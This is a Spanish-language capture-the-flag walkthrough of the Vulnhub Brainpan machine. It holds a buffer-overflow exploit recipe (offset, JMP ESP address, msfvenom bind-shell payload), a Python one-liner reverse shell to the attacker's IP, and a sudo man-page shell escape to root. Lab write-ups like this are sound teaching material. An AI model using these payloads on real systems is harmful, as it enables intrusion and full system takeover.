# BrainPan CTF

**Autor:** Codigonat  
**Fecha:** 8 de julio de 2025  
**Dificultad:** Fácil  
**Sistema Operativo:** Linux  
**Tags:** CTF, Vulnhub, Msfvenom, Practica, Vulneracion  

---

## Reconocimiento Inicial

<p># Reconocimiento Inicial</p><h2> ## reconocimiento de ip del objetivo</h2><h2>utilizamos netdiscover para poder identificar la ip de la máquina objetivo </h2><h2>┌──(codigonat㉿Codigonat)-[~]</h2><p>└─$ sudo netdiscover -i eth0   <br>   ##  Currently scanning: 192.168.152.0/16   |   Screen View: Unique Hosts                                                                                                                                                                       </p><p>                                                                                                                                                                                                                                            </p><p> 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                                            </p><p> _____________________________________________________________________________</p><p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </p><p> -----------------------------------------------------------------------------</p><p> 192.168.114.134 00:0c:29:8d:b4:13      1      60  VMware, Inc.                                                                                                                                                                             </p><p> 192.168.114.254 00:50:56:fc:a9:f4      1      60  VMware, Inc.   </p><p></p><p></p><p>  ##  identificamos que la ip de la maquina objetivo es la primera 192.168.114.134 máquina objetivo Branpan ya que es la uncia que se encuentra en nuestra <a target="_blank" rel="noopener noreferrer nofollow" href="http://localhost">localhost</a> ya que la segunda ip es del propio sistema de virtualizacion llamado vmware</p><p></p><p>   ### segumos con la fase activa de enumeración comenzamos con un nmap para escanear todos los servicios que estan corriendo en la maquina objetivo agregando las flags -C Y -V para que nos muestre el nombre de los servicios y que corra automáticamente algunos scrips de detección de vulnerabilidades del propio nmap </p><p></p><p></p><p>  ###   ┌──(codigonat㉿Codigonat)-[~]</p><p>└─$ sudo nmap -sCV -p- 192.168.114.134              </p><p>[sudo] contraseña para codigonat: </p><p>Starting Nmap 7.95 ( <a target="_blank" rel="noopener noreferrer nofollow" href="https://nmap.org">https://nmap.org</a> ) at 2025-07-08 17:38 CST</p><p>Nmap scan report for 192.168.114.134</p><p>Host is up (0.0044s latency).</p><p>Not shown: 65533 closed tcp ports (reset)</p><p>PORT      STATE SERVICE VERSION</p><p>9999/tcp  open  abyss?</p><p>| fingerprint-strings: </p><p>|   NULL: </p><p>|     <em>| </em>| </p><p>|     <em>|</em>|_| <em>| </em>|_| <em>|</em>|_| <em>|</em>|_| <em>|</em>|_| <em>|</em>|_| <em>|</em>|_| </p><p>|     <em>|</em>| <em>| </em>| <em>| </em>| <em>| </em>| <em>| </em>| <em>| </em>| _|</p><p>|     <em>|</em>|_| <em>| </em>|_|_| <em>| </em>| <em>| </em>|_|_| <em>|</em>|_| <em>| </em>|</p><p>|     [________________________ WELCOME TO BRAINPAN _________________________]</p><p>|_    ENTER THE PASSWORD</p><p>10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</p><p>|_http-title: Site doesn't have a title (text/html).</p><p>|_http-server-header: SimpleHTTP/0.6 Python/2.7.3</p><p>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a target="_blank" rel="noopener noreferrer nofollow" href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :</p><p>SF-Port9999-TCP:V=7.95%I=7%D=7/8%Time=686DAC08%P=x86_64-pc-linux-gnu%r(NUL</p><p>SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</p><p>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\</p><p>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</p><p>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</p><p>SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\</p><p>SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x</p><p>SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2</p><p>SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2</p><p>SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2</p><p>SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\</p><p>SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2</p><p>SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2</p><p>SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2</p><p>SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\</p><p>SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2</p><p>SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\</p><p>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</p><p>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</p><p>SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</p><p>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20</p><p>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</p><p>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</p><p>SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2</p><p>SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</p><p>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2</p><p>SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</p><p>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x</p><p>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</p><p>SF:x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");</p><p>MAC Address: 00:0C:29:8D:B4:13 (VMware)</p><p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener noreferrer nofollow" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p><p>Nmap done: 1 IP address (1 host up) scanned in 41.63 seconds</p><p>                                                               </p><p>podemos observar dos servicios interesantes los cuales estan corriendo por el puerto 10000/9999 procedemos a ver si en estos puertos esta corriendo alguna pagina web o algo donde podamos buscar mas informacion del objetivo encontramos un apagina web  con un png donde habla un poco de las top vulnerabilidades entre otras cosas </p><h3>  ##  como no se encontro nada concluyente a simple vista procedemos a hace un escaneo de directorios ocultos a al puerto 10000 con la herramienta gobuster.</h3><p></p><p>   ##  Gobuster</p><p></p><p></p><h1>#                                                                                                                                                                                                                                            </h1><p>┌──(codigonat㉿Codigonat)-[~]</p><p>└─$ gobuster dir -u <a target="_blank" rel="noopener noreferrer nofollow" href="http://192.168.114.134:10000/">http://192.168.114.134:10000/</a>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,git,js,bak,css</p><p>===============================================================</p><p>Gobuster v3.6</p><p>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</p><p>===============================================================</p><p>[+] Url:                     <a target="_blank" rel="noopener noreferrer nofollow" href="http://192.168.114.134:10000/">http://192.168.114.134:10000/</a></p><p>[+] Method:                  GET</p><p>[+] Threads:                 10</p><p>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p><p>[+] Negative Status codes:   404</p><p>[+] User Agent:              gobuster/3.6</p><p>[+] Extensions:              css,php,html,txt,git,js,bak</p><p>[+] Timeout:                 10s</p><p>===============================================================</p><p>Starting gobuster in directory enumeration mode</p><p>===============================================================</p><p>/index.html           (Status: 200) [Size: 215]</p><p>/bin                  (Status: 301) [Size: 0] [--&gt; /bin/]</p><p>Progress: 1764480 / 1764488 (100.00%)</p><p>===============================================================</p><p>Finished</p><p>===============================================================</p><p></p><p></p><h1> #Esto nos a revelado el directorio /bin/ en el cual encontramos un archivo ejecutable .exe (brainpan.exe) como se muestra en las fotos.</h1>

---

## Explotación

<p></p><p>### Bloque Markdown: Fase 1 (Explotación)</p><p>```markdown</p><p># Fase 1: Explotación Inicial (Obtención de Acceso)</p><p><strong>Objetivo:</strong> Obtener un punto de entrada inicial en la máquina Brainpan, comprometiendo el primer servicio y consiguiendo una shell de bajo privilegio.</p><p>### 1. Reconocimiento (Nmap &amp; Gobuster)</p><p>- La investigación comenzó con un escaneo exhaustivo de puertos utilizando <strong>Nmap</strong>. Esto permitió identificar la superficie de ataque principal.</p><p>```bash</p><p>nmap -sCV -p- 192.168.114.134</p><p>```</p><p><strong>Resultados Clave:</strong></p><p>- *<code>9999/tcp</code>**: Se descubrió un servicio personalizado "Brainpan" que, por su naturaleza (aplicación a medida que pide una entrada), era el principal candidato para una vulnerabilidad de <strong>Buffer Overflow</strong>.</p><p>- *<code>10000/tcp</code>**: Se encontró un servidor web <code>SimpleHTTPServer</code> corriendo en Python, el cual podría alojar archivos de interés.</p><p>- Dado que la página web en el puerto <code>10000</code> no mostraba información relevante a simple vista, se procedió a una enumeración de directorios con <strong>Gobuster</strong>.</p><p>```bash</p><p>gobuster dir -u <a target="_blank" rel="noopener noreferrer nofollow" href="http://192.168.114.134:10000/">http://192.168.114.134:10000/</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p><p>```</p><p><strong>Descubrimiento Crítico:</strong> Se encontró el directorio <code>/bin</code>, y al navegar a <code>http://192.168.114.134:10000/bin/</code>, se localizó el ejecutable *<code>brainpan.exe</code>**, confirmando que era el binario del servicio del puerto 9999.</p><p>### 2. Desarrollo del Exploit (Buffer Overflow)</p><p>- Se descargó <code>brainpan.exe</code> para su análisis en un entorno de laboratorio seguro (una VM con Windows y el debugger <strong>x32dbg</strong>). Esto permitió desarrollar el exploit sin afectar a la máquina objetivo.</p><p>- <strong>Análisis de la Vulnerabilidad:</strong></p><p>1. <strong>Fuzzing:</strong> Se creó un script de Python para enviar cadenas de 'A's de longitud creciente. Se confirmó que el programa crasheaba y que el registro <strong>EIP</strong> era sobrescrito con *<code>41414141</code>**, demostrando la vulnerabilidad.</p><p>2. <strong>Offset Exacto:</strong> Utilizando un patrón único generado con <code>msf-pattern_create</code>, se envió al programa. Al analizar el valor de EIP en el momento del crash <code>35724131</code>) con <code>msf-pattern_offset</code>, se calculó un offset exacto de <strong>519 bytes</strong>.</p><p>3. <strong>Bad Chars:</strong> Se envió una carga con todos los caracteres posibles (de <code>\x01</code> a <code>\xff</code>). Tras revisar el volcado de memoria en el debugger, se concluyó que el único bad char a evitar era el byte nulo <code>\x00</code>).</p><p>4. <strong>Dirección de Salto:</strong> Para desviar la ejecución del programa hacia nuestro shellcode, se buscó una instrucción <code>JMP ESP</code> en una dirección de memoria estática (dentro del propio módulo <code>brainpan.exe</code>). Se encontró una dirección fiable en *<code>311712F3</code>**.</p><p>### 3. Obtención de Shell Inicial (Táctica de Bind Shell)</p><p>- Después de que los intentos iniciales con una <em>reverse shell</em> fallaran (indicando posibles problemas de firewall o complejidad), se optó por la táctica más robusta de una <strong>bind shell</strong>.</p><p>- Se generó un payload compacto y simple con <code>msfvenom</code> para que la víctima abriera el puerto <code>1337</code>:</p><p>```bash</p><p>msfvenom -p windows/shell_bind_tcp LPORT=1337 -b "\x00" -f python</p><p>```</p><p>- Se construyó el exploit final en Python con la estructura:</p><p>```python</p><p># Relleno + Dirección de Salto + NOP Sled + Shellcode</p><p>payload = (b"A" <em>519) + (b"\xf3\x12\x17\x31") + (b"\x90" </em>32) + (bind_shellcode)</p><p>```</p><p></p><p>- Se lanzó el exploit contra la IP real de Brainpan. Inmediatamente después, se estableció conexión a la puerta trasera que nuestro exploit había abierto:</p><p>```bash</p><p>nc -nv 192.168.114.134 1337</p><p>```</p><p>- <strong>Resultado:</strong> Se obtuvo con éxito una shell en la máquina. Se descubrió que <code>brainpan.exe</code> se ejecutaba a través de <strong>Wine</strong> en un sistema Linux, y el acceso se consiguió como el usuario de bajo privilegio *<code>puck</code>**.</p><p>```</p><p></p>

---

## Escalada de Privilegios

<p></p><p>### Bloque Markdown: Fase 2 (Estabilización de Shell)</p><p>```markdown</p><p>## Fase 2: Estabilización de la Shell</p><p>**Objetivo:** Transformar el acceso inicial limitado en una shell interactiva y funcional, una etapa crucial para poder ejecutar comandos complejos de enumeración y escalada.</p><p>### 1. Diagnóstico de la Shell Limitada</p><p>- La shell obtenida tras la explotación inicial <code>Z:\&gt;</code>) era un intérprete de comandos de bajo nivel proporcionado por el entorno de compatibilidad **Wine**.</p><p>- Esta shell demostró ser muy restrictiva:</p><p>- No reconocía comandos básicos de Linux como <code>ls</code>, <code>whoami</code> o <code>sudo</code>.</p><p>- No tenía una variable de <code>PATH</code> configurada, lo que obligaba a usar rutas completas para ejecutar binarios (ej. <code>/usr/bin/python</code>).</p><p>- Era incapaz de iniciar un TTY interactivo estándar con <code>pty.spawn()</code> directamente desde la línea de comandos, devolviendo errores de sintaxis o fallando silenciosamente.</p><p>- Estas limitaciones hacían imposible la ejecución de comandos de enumeración esenciales como <code>sudo -l</code>, bloqueando el progreso hacia la escalada de privilegios.</p><p>### 2. Creación de una Reverse Shell para la Estabilización</p><p>- Dado que los métodos para "mejorar" la shell actual fallaron, se adoptó la táctica profesional de forzar a la víctima a conectarse de vuelta a nosotros, entregando una shell superior.</p><p>- Se sabía que el binario <code>/usr/bin/python</code> estaba disponible y era funcional en la máquina víctima.</p><p>- **Proceso de Estabilización:**</p><p>1. Se preparó un listener **Netcat** en la máquina de ataque (Kali) para recibir la nueva conexión en el puerto <code>4444</code>.</p><p>```bash</p><p>nc -lvnp 4444</p><p>```</p><p>2. Desde la shell limitada de la víctima, se utilizó el comando <code>echo</code> para escribir un script de **reverse shell** de Python directamente en un directorio con permisos de escritura <code>/tmp/</code>).</p><p>```bash</p><p>echo 'import socket,os,pty;s=socket.socket();s.connect(("192.168.114.131",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' &gt; /tmp/get_<a target="_blank" rel="noopener noreferrer nofollow" href="http://shell.py">shell.py</a></p><p>```</p><p>3. Finalmente, se ordenó a la víctima que ejecutara este script usando la ruta completa de Python:</p><p>```bash</p><p>/usr/bin/python /tmp/get_<a target="_blank" rel="noopener noreferrer nofollow" href="http://shell.py">shell.py</a></p><p>```</p><p>- **Resultado:** La máquina víctima se conectó de vuelta al listener de Netcat, y se obtuvo una **shell <code>bash</code> de Linux completamente interactiva y funcional**, como el usuario *<code>puck</code>**. Esto desbloqueó la capacidad de usar todo el conjunto de herramientas del sistema operativo.</p><p>```</p><p></p>

---

## User Flag

<p></p><p>### Bloque Markdown: Fase 3 (Escalada de Privilegios)</p><p>```markdown</p><p>## Fase 3: Escalada de Privilegios y Captura de la Root Flag</p><p><strong>Objetivo:</strong> Elevar los privilegios del usuario <code>puck</code> al superusuario <code>root</code> para obtener el control total del sistema y capturar la bandera final.</p><p>### 1. Identificación del Vector de Escalada</p><p>- Con una shell <code>bash</code> estable e interactiva, el primer paso fue investigar posibles rutas de escalada de privilegios. El comando fundamental para esto en sistemas Linux es <code>sudo -l</code>.</p><p>- Se ejecutó el comando para ver qué permisos de <code>sudo</code> tenía el usuario <code>puck</code>:</p><p>  ```bash</p><p>  sudo -l</p><p>  ```</p><p>- <strong>Descubrimiento Crítico:</strong> La salida del comando reveló un vector de escalada claro y directo:</p><p>  ```</p><p>  User puck may run the following commands on this host:</p><p>      (root) NOPASSWD: /home/anansi/bin/anansi_util</p><p>  ```</p><p>- Este resultado confirmó que <code>puck</code> podía ejecutar el binario <code>/home/anansi/bin/anansi_util</code> con los privilegios de *<code>root</code>** y, crucialmente, sin necesidad de proporcionar una contraseña <code>NOPASSWD</code>).</p><p>### 2. Explotación del Binario con Permisos de Sudo (Escape desde <code>man</code>)</p><p>- Para entender cómo abusar de este permiso, primero se investigó el binario privilegiado:</p><p>  ```bash</p><p>  /home/anansi/bin/anansi_util</p><p>  ```</p><p>- El programa mostró un menú de ayuda, donde una opción destacaba por su potencial de ser explotada: *<code>manual [command]</code>**. Esto indicaba que el programa actuaba como un intermediario para el comando <code>man</code> de Linux.</p><p>- Se identificó una técnica de escalada de privilegios clásica que abusa de la funcionalidad interna de <code>man</code> (que a su vez utiliza paginadores como <code>less</code>), la cual permite ejecutar comandos del sistema.</p><p>- <strong>Proceso de Escalada:</strong></p><p>  1. Se ejecutó <code>anansi_util</code> con <code>sudo</code>, pidiéndole que abriera el manual de un comando conocido para asegurar que el programa se ejecutara correctamente:</p><p>     ```bash</p><p>     sudo /home/anansi/bin/anansi_util manual ls</p><p>     ```</p><p>  2. Esto cargó la página del manual en la terminal, pero con los permisos de <code>root</code>. En este punto, la terminal estaba efectivamente dentro de un programa que corría como superusuario.</p><p>  3. Sin salir del visor del manual, se introdujo el comando de escape para lanzar una shell:</p><p>     ```bash</p><p>     !/bin/bash</p><p>     ```</p><p>### 3. Captura de la Bandera Final <code>root.txt</code>)</p><p>- <strong>Resultado Inmediato:</strong> El prompt de la terminal cambió de <code>puck@brainpan:~$</code> a *<code>root@brainpan:~#</code>**. El símbolo <code>#</code> confirmó que la escalada a <code>root</code> había sido exitosa.</p><p>- Con privilegios de superusuario, se navegó al directorio personal de <code>root</code>, que antes era inaccesible:</p><p>  ```bash</p><p>  cd /root</p><p>  ```</p><p>- Se listó el contenido del directorio y se encontró el archivo de la bandera final, *<code>b.txt</code>**. Se procedió a leer su contenido para completar el reto:</p><p>  ```bash</p><p>  ls -la</p><p>  cat b.txt</p><p>  ```</p><p>- La lectura del archivo <code>b.txt</code> confirmó la <strong>conquista total de la máquina Brainpan</strong>.</p><p>```</p><p></p>

